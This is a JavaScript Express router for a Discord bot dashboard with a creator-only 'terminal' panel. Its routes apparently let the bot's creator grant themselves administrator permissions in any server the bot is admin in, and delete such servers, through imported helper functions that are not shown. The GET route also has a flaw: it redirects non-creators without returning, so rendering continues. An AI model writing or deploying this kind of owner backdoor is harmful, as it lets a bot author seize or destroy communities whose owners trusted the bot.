const { User, Guild, getDatabase, getLanguagePack, log } = require('../utils');
const { getGuildsList, toggleAdminPermissions, deleteGuild } = require('../discord');
const express = require('express');
const router = express.Router();
const fs = require('fs');
const ejs = require('ejs');

router.get('/', async (request, response) => {
  const user = new User();
  await user.fetch(request.cookies.token);

  const Guilds = await getDatabase("guilds");
  const guilds = await Guilds.find({}).toArray();
  
  const guild = new Guild();
  const guildWithMaxMembers = guilds
    .filter(guild => guild.isBotAdmin && !guild.isGuildFake)
    .sort((a, b) => b.members - a.members);
  await guild.fetch(guildWithMaxMembers[0].id);
  guild.getStatisticsField()
  const lang = getLanguagePack(request.cookies.lang);

  !user.isCreator ? response.redirect('/') : null;

  try {
    const terminalData = {
      user,
      guilds,
      lang
    };

    const body = ejs.render(fs.readFileSync('views/terminal.ejs', 'utf8'), terminalData);

    response.render('template.ejs', {
      body,
      user,
      lang
    });
  } catch (error) {
    console.log(error);
    response.redirect('/');
  }
});

router.post('/guild-mode-select', async (request, response) => {
  const user = new User();
  await user.fetch(request.cookies.token);
  if (!user.isCreator) return response.redirect('/');
  
  const lang = getLanguagePack(request.cookies.lang);

  const guild = new Guild();
  await guild.fetch(request.body.id);
  guild.getStatisticsField()
  
  if (guild.id) {
    const body = ejs.render(fs.readFileSync('views/modules/terminal/guild/body.ejs', 'utf8'), { guild, lang });
    log(`Надіслано: ${(body.length / 1024 / 1024 * 8).toFixed(1)} мегабайти`, 'p')
    response.status(200).send(body);
  } else {
    response.status(403).send()
  }
});

router.post('/get-admin-permisson', async (request, response) => {
  const user = new User();
  await user.fetch(request.cookies.token);
  if (!user.isCreator) return response.redirect('/');

  const guild = new Guild();
  await guild.fetch(request.body.id);

  guild.isMiregAdmin = await toggleAdminPermissions(request.body.id, user.id);

  if (guild.id) {
    const body = ejs.render(fs.readFileSync('views/modules/terminal/guild/main-panel-buttons.ejs', 'utf8'), { guild });
    response.status(200).send(body);
    await guild.save();
  } else {
    response.status(403).send()
  }
});

router.post('/delete-guild', async (request, response) => {
  const user = new User();
  await user.fetch(request.cookies.token);
  if (!user.isCreator) return response.redirect('/');

  const guild = new Guild();
  await guild.fetch(request.body.id);

  await deleteGuild(request.body.id);

  if (guild.id) {
    const body = ejs.render(fs.readFileSync('views/modules/terminal/guild/main-panel-buttons.ejs', 'utf8'), { guild });
    response.status(200).send(body);
    await guild.save();
  } else {
    response.status(403).send()
  }
});

module.exports = router;